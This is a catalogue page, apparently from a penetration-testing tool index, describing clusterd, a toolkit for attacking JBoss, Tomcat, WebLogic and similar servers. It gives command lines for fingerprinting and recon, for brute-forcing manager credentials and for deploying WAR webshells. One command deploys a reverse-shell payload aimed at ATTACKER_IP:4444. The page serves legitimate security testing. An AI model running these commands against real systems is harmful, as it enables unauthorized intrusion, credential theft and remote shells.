---
name: "clusterd"
categories:
  - blackarch-automation
version: "143.d190b2c"
homepage: "https://github.com/hatRiot/clusterd"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-25"
build-system: scripts
license: MIT
meta-checked: "2026-11-09"
github-repo: "hatRiot/clusterd"
github-stars: 689
github-pushed: "2020-04-06"
github-archived: false
github-issues: 10
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.9
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# clusterd

> Application-server attack toolkit: fingerprint, recon, and exploit JBoss, WebLogic, Tomcat, and friends.

## What it's for

clusterd automates the fingerprinting, reconnaissance and exploitation phases of an application-server attack across seven platforms: JBoss (3.x-8.1), ColdFusion (5-11), WebLogic (7-12), Tomcat (3.x-8.x), Railo (3.x-4.x), Axis2 (1.4-1.6) and GlassFish (3.x-4.x). For each platform it knows the version-specific fingerprints, the deployer mechanisms (JMX consoles, invoker servlets, task scheduler, manager interfaces), and auxiliary exploits (verb tampering, hash retrieval, RDS bypass), and can chain them: fingerprint a host, dump deployed WARs and OS/Java info, brute-force manager credentials, deploy a generated WAR payload and invoke it for a reverse shell. It is a Python 2.7-era tool (last push 2020) targeting server versions that are themselves legacy, so expect it on old infrastructure engagements rather than current fleets; it needs Python ≥ 2.7 and the `requests` library.

## Typical use cases

### Fingerprint an unknown application server

Identify platform and version before choosing an attack path.

```
./clusterd.py -i 198.51.100.10 -p 8080 --fingerprint --random-agent
```

Outcome: probes the host's HTTP surface and prints every fingerprint signature that matches (e.g. "JBoss JMX Console (version 5.0)"), along with a summary count per platform; use the detected version with `-v` in later steps.

### Pull host and platform details from a JBoss instance

Recon beyond the version number.

```
./clusterd.py -i 198.51.100.10 -a jboss -v 5.0 --random-agent
```

Outcome: fingerprints the server with the platform hint, then queries JBoss MBeans for host details — OS name/arch/version, Java version and vendor, memory and thread counts, hostname — printing each attribute as it is retrieved.

### Deploy a WAR to a discovered deployer

Get code execution via the platform's deployment mechanism.

```
./clusterd.py -i 198.51.100.10 -a jboss -v 5.0 --deploy cmd.war --random-agent
```

Outcome: selects a version-appropriate deployer (JMX console, invoker servlet, management interface per platform/version), uploads `cmd.war`, and confirms the deployed context path; interact with the deployed webshell to run commands.

### Generate, deploy, and invoke a reverse shell payload

The full chain against an exposed Tomcat manager.

```
./clusterd.py -i 198.51.100.10 -a tomcat -v 5.5 --gen-payload ATTACKER_IP:4444 --deploy shell.war --invoke --rand-payload -o windows
```

Outcome: builds a JSP reverse-shell WAR aimed at ATTACKER_IP:4444, deploys it under a randomized context name, invokes it immediately, and the handler on the listener receives the shell.

### Brute-force manager credentials

Wordlist attack against the admin interface.

```
./clusterd.py -i 198.51.100.10 -a tomcat -b admin --wordlist passwords.txt
```

Outcome: attempts each password for the given user (default `admin`) against the platform's management interface and reports the working credential, which can then be reused for `--usr-auth` deployments.

### Discover application servers across a scanned network

Triage many hosts from an existing port scan.

```
./clusterd.py --discover scan.gnmap
```

Outcome: parses the Nmap GNMAP output (scan must have been run with `-sV`) and attempts application-server discovery against every host in it, highlighting the attackable ones.

*No corpus evidence — derived from upstream documentation.*
